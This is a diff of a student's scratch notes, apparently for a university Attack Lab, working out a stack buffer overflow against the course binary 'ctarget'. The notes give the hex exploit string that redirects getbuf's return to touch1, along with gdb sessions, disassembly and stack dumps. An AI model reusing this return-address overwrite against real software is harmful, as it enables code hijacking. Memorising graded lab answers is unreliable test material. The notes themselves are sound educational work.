@@ -1,13 +1,21 @@
 Phase 1 / Level 1
+------------------
+input:
+fffffffffffffffffffffff^@�]UUUU^@
 
-- wont inject new code, exploit str will redirect program to execute an existing procedure
+any characters (buffersize - 1) + null terminate str + address of function touch1
 
-----------------------------
-./hex2raw < strs.txt | ./ctarget
+66 66 66 66 66 66 66 66
+66 66 66 66 66 66 66 66
+66 66 66 66 66 66 66 00     // input characters with null to fill buffer
+cb 5d 55 55 55 55 00 00     // address of touch1
+--------------------------------------------------------
+./hex2raw < strs.txt | ./ctarget -q
 
 getbuf is called within ctarget by function test
 when getbuf returns, it returns to function test
 
+- wont inject new code, exploit str will redirect program to execute an existing procedure
 get ctarget to execute code for touch1 when getbuf returns, rather than returning to test
 
 notes:
@@ -19,17 +27,40 @@ constant BUFFER_SIZE, as well the allocation strategy used by GCC. examine the d
 determine its position
 
 
+hex2raw:
+- takes input as hex formatted string
+- null terminated w 00
+// pipes to run ctarget w hex2raw input
+    unix> cat exploit.txt | ./hex2raw | ./ctarget
+// get file
+    unix> ./hex2raw < exploit.txt > exploit-raw.txt
+    unix> ./ctarget < exploit-raw.txt
+// in gdb
+    unix> gdb ctarget
+        (gdb) run < exploit-raw.txt
+// idk i forgot another way i think w -i
+    unix> ./hex2raw < exploit.txt > exploit-raw.txt
+    unix> ./ctarget -i exploit-raw.txt
+
+// str_to_hex.py takes a string in plaintext from strs.txt and replaces it with hex character values
+python3 str_to_hex.py && ./hex2raw < strs.txt > exploits.txt
+
+
 (function addresses from objdump)
 getbuf =    0x0000000000001db1
 test =      0x0000000000001fa0 
 touch1 =    0x0000000000001dcb
 
 hex2raw test:
-"teststr" = 74 65 73 74 73 74 72    // get_hex.py
-"tst" = 74 73 74
+"teststr" = 74 65 73 74 73 74 72 00   // get_hex.py
+"tst" = 74 73 74 00 
+“012345” = 30 31 32 33 34 35 00
 
 
------ C functions
+// (apparently has to be run on Ubuntu 20.4. otherwise doesnt take input)
+
+
+-------------------------------------------------------- C functions
 
 // getbuf
 // reads strings from random input
@@ -56,4 +87,267 @@ void touch1() {
     exit(0);
 }
 
+-------------------------------------------------------- notes
+overflow buffer to call touch1
 
+
+./hex2raw < strs.txt > exploits.txt         // hex from strs --> raw in exploits
+python3 str_to_hex.py                       // raw from strs --> hex in strs
+
+// --------------- run
+gdb ctarget
+    run < exploits.txt -q
+
+// --------------- .gdbinit
+nano ~/.gdbinit
+
+
+-------
+find buffer size:
+- break at getbuf after Gets()
+b *(getbuf+16)
+- find where next address starts
+x/32xb $rsp
+
+
+retq: pops the return address from the stack into the destination %rip 
+
+
+1db1 <getbuf>
+0x0000 5555 5555 5db1
+1fa0 <test>
+0x0000 5555 5555 5fa0
+1dcb <touch1>
+0x0000 5555 5555 5dcb
+
+---
+
+buffer_size = 23
+
+rdi = 0000 5555 5fb2 
+rdi needs to be 0000 5555 5dcb
+
+rsp after Gets() needs to be
+23 characters + null + address of Touch1
+
+66 66 66 66 66 66 66 66
+66 66 66 66 66 66 66 66
+66 66 66 66 66 66 66 00
+cb 5d 55 55 55 55 00 00
+
+ffffffff
+ffffffff
+fffffff^@
+�]UUUU^@
+
+fffffffffffffffffffffff^@�]UUUU^@
+
+-------------------------------------------------------- disass functions 
+
+
+// getbuf (objdump)
+0000000000001db1 <getbuf>:
+    1db1:	f3 0f 1e fa          	endbr64 
+    1db5:	48 83 ec 18          	sub    $0x18,%rsp
+    1db9:	48 89 e7             	mov    %rsp,%rdi
+    1dbc:	e8 bb 02 00 00       	callq  207c <Gets>
+    1dc1:	b8 01 00 00 00       	mov    $0x1,%eax
+    1dc6:	48 83 c4 18          	add    $0x18,%rsp
+    1dca:	c3                   	retq   
+// getbuf (disass)
+Dump of assembler code for function getbuf:
+   0x0000555555555db1 <+0>:	endbr64 
+   0x0000555555555db5 <+4>:	sub    $0x18,%rsp
+   0x0000555555555db9 <+8>:	mov    %rsp,%rdi
+   0x0000555555555dbc <+11>:	callq  0x55555555607c <Gets>
+   0x0000555555555dc1 <+16>:	mov    $0x1,%eax
+   0x0000555555555dc6 <+21>:	add    $0x18,%rsp
+=> 0x0000555555555dca <+25>:	retq   
+End of assembler dump.
+
+
+
+
+// test
+0000000000001fa0 <test>:
+    1fa0:	f3 0f 1e fa          	endbr64 
+    1fa4:	48 83 ec 08          	sub    $0x8,%rsp
+    1fa8:	b8 00 00 00 00       	mov    $0x0,%eax
+    1fad:	e8 ff fd ff ff       	callq  1db1 <getbuf>
+    1fb2:	89 c2                	mov    %eax,%edx
+    1fb4:	48 8d 35 9d 23 00 00 	lea    0x239d(%rip),%rsi        # 4358 <_IO_stdin_used+0x358>
+    1fbb:	bf 01 00 00 00       	mov    $0x1,%edi
+    1fc0:	b8 00 00 00 00       	mov    $0x0,%eax
+    1fc5:	e8 e6 f3 ff ff       	callq  13b0 <__printf_chk@plt>
+    1fca:	48 83 c4 08          	add    $0x8,%rsp
+    1fce:	c3                   	retq   
+// test
+Dump of assembler code for function test:
+   0x0000555555555fa0 <+0>:	endbr64 
+   0x0000555555555fa4 <+4>:	sub    $0x8,%rsp
+   0x0000555555555fa8 <+8>:	mov    $0x0,%eax
+   0x0000555555555fad <+13>:	callq  0x555555555db1 <getbuf>
+   0x0000555555555fb2 <+18>:	mov    %eax,%edx
+   0x0000555555555fb4 <+20>:	lea    0x239d(%rip),%rsi        # 0x555555558358
+   0x0000555555555fbb <+27>:	mov    $0x1,%edi
+   0x0000555555555fc0 <+32>:	mov    $0x0,%eax
+   0x0000555555555fc5 <+37>:	callq  0x5555555553b0 <__printf_chk@plt>
+   0x0000555555555fca <+42>:	add    $0x8,%rsp
+   0x0000555555555fce <+46>:	retq   
+End of assembler dump.
+
+
+
+
+// touch1
+0000000000001dcb <touch1>:
+    1dcb:	f3 0f 1e fa          	endbr64 
+    1dcf:	50                   	push   %rax
+    1dd0:	58                   	pop    %rax
+    1dd1:	48 83 ec 08          	sub    $0x8,%rsp
+    1dd5:	c7 05 fd 55 00 00 01 	movl   $0x1,0x55fd(%rip)        # 73dc <vlevel>
+    1ddc:	00 00 00 
+    1ddf:	48 8d 3d ae 24 00 00 	lea    0x24ae(%rip),%rdi        # 4294 <_IO_stdin_used+0x294>
+    1de6:	e8 b5 f4 ff ff       	callq  12a0 <puts@plt>
+    1deb:	bf 01 00 00 00       	mov    $0x1,%edi
+    1df0:	e8 15 05 00 00       	callq  230a <validate>
+    1df5:	bf 00 00 00 00       	mov    $0x0,%edi
+    1dfa:	e8 01 f6 ff ff       	callq  1400 <exit@plt>
+// touch1
+Dump of assembler code for function touch1:
+   0x0000555555555dcb <+0>:	endbr64 
+   0x0000555555555dcf <+4>:	push   %rax
+   0x0000555555555dd0 <+5>:	pop    %rax
+   0x0000555555555dd1 <+6>:	sub    $0x8,%rsp
+   0x0000555555555dd5 <+10>:	movl   $0x1,0x55fd(%rip)        # 0x55555555b3dc <vlevel>
+   0x0000555555555ddf <+20>:	lea    0x24ae(%rip),%rdi        # 0x555555558294
+   0x0000555555555de6 <+27>:	callq  0x5555555552a0 <puts@plt>
+   0x0000555555555deb <+32>:	mov    $0x1,%edi
+   0x0000555555555df0 <+37>:	callq  0x55555555630a <validate>
+   0x0000555555555df5 <+42>:	mov    $0x0,%edi
+   0x0000555555555dfa <+47>:	callq  0x555555555400 <exit@plt>
+End of assembler dump.
+
+
+--------------------------------------------------------
+-------- scratch paper type notes and test stuffs
+
+
+0000 0000 0000 1db1 <getbuf>
+0x0000555555555db1
+0000 0000 0000 1fa0 <test>
+0x0000555555555fa0
+0000 0000 0000 1dcb <touch1>
+0x0000555555555dcb
+
+e8 ff fd ff ff       	callq  1db1 <getbuf>
+e8 bb 02 00 00       	callq  207c <Gets>
+e8 b5 f4 ff ff       	callq  12a0 <puts@plt>
+e8 15 05 00 00       	callq  230a <validate>
+
+
+- step through ctarget find where input is stored 
+- see where it overflows
+- get reg/address where input is stored
+
+-------------------------- a test
+
+input:
+eeeeeeeeeeeeeee
+65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 00
+
+--step through until getbuf
+b *(getbuf+16)
+--info from registers to find stored input
+i r rsp = 0x55618d98
+x/16xb $rdx = input     //?
+i r rdi = 0x7ffff7fa0980      140737353746816
+x/16xb $rdx = input
+i r eax = &input
+i r rax = &input
+
+(gdb) x/32xb $rsp
+0x55618d98:	0x65	0x65	0x65	0x65	0x65	0x65	0x65	0x65
+0x55618da0:	0x65	0x65	0x65	0x65	0x65	0x65	0x65	0x00    
+0x55618da8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00    // end of input buffer
+
+0x55618db0:	0xb2	0x5f	0x55	0x55	0x55	0x55	0x00	0x00
+b2 5f 55 55 55 55 55 00 00 = 0x555555555fb2
+
+buffer_size = 23 bytes 
+
+
+(gdb) x/16xb $rdi
+0x7ffff7fa0980 <_IO_2_1_stdin_>:	0x88	0x20	0xad	0xfb	0x00	0x000x00	0x00
+0x7ffff7fa0988 <_IO_2_1_stdin_+8>:	0xc0	0xd6	0x55	0x55	0x55	0x550x00	0x00
+
+
+--break at add
+b *(getbuf+21)
+mov    $0x1,%eax
+
+i r rsp = 0x55618d98
+x/16xb $rsp = input
+i r rdi = 0x7ffff7fa0980
+i r eax = 1
+
+
+
+--break at retq
+b *(getbuf+25)
+add    $0x18,%rsp
+
+i r rsp = 0x55618db0
+i r rip = 0x5555 5555 5dca
+
+(gdb) x/32xb $rsp
+0x55618db0:	0xb2	0x5f	0x55	0x55	0x55	0x55	0x00	0x00
+0x000055555fb2      // test+18
+0x55618db8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x55618dc0:	0x11	0x66	0x55	0x55	0x55	0x55	0x00	0x00
+0x55618dc8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+
+
+-------------------------- another test
+
+input: (str into exploits without hex2raw)
+keeeeeeeeeeeeea
+6b 65 65 65 65 65 65 65 65 65 65 65 65 65 61 00
+
+---
+b *(getbuf+16)
+run < exploits.txt -q
+x/32xb $rsp
+
+// (testing if str input stayed in order in rsp and it does)
+
+-------------------------- anotehr test
+
+input: 
+fffffffffffffffffffffff^@�]UUUU^@
+
+66 66 66 66 66 66 66 66
+66 66 66 66 66 66 66 66
+66 66 66 66 66 66 66 00
+cb 5d 55 55 55 55 00 00
+
+---
+b *(getbuf+16)
+run < exploits.txt -q
+x/32xb $rsp
+
+// (ok genuine test now tho)
+
+(gdb) x/32xb $rsp
+0x55618d98:	0x66	0x66	0x66	0x66	0x66	0x66	0x66	0x66
+0x55618da0:	0x66	0x66	0x66	0x66	0x66	0x66	0x66	0x66
+0x55618da8:	0x66	0x66	0x66	0x66	0x66	0x66	0x66	0x00
+0x55618db0:	0xcb	0x5d	0x55	0x55	0x55	0x55	0x00	0x00
+
+
+the correct input is
+fffffffffffffffffffffff^@�]UUUU^@
+cool cool cool
+
+(though i may need to adjust for buffersize once i try it on the vpn.
+im not entirely certain on that)
